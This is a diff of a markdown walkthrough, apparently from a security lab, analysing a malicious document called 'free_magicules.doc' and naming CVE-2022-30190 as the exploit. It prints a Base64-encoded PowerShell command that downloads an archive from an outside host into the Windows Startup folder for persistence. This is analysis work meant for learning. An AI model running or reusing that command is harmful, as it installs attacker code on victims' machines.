@@ -67,6 +67,22 @@ document named "free_magicules.doc."
 
 > Moving on, i retrieved the Base64 encoded string in the malicious payload executed by the document to be:
 NhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
+>
+> <img width="1131" height="658" alt="10" src="https://github.com/user-attachments/assets/97e29add-ad88-4186-959c-50d66c6ddb1a" />
+
+> I then identified the CVE number of the exploit used by the attacker to achieve a remote code execution to be:
+2022-30190
+I retrieved it by locating the binary with the same Base64 string, then inputted the binary within the input field of the LOLBAS website.
+>
+> <img width="1166" height="563" alt="11" src="https://github.com/user-attachments/assets/b7b95b57-9779-472c-b8a3-415fdebd5153" />
+> <img width="1119" height="478" alt="12" src="https://github.com/user-attachments/assets/6ba876b0-be95-4240-847c-cc1ff23b4cbc" />
+> <img width="1113" height="200" alt="13" src="https://github.com/user-attachments/assets/3b134a7b-db4c-4228-bf21-cfd65467fd89" />
+
+> 
+
+
+
+
 
 
 
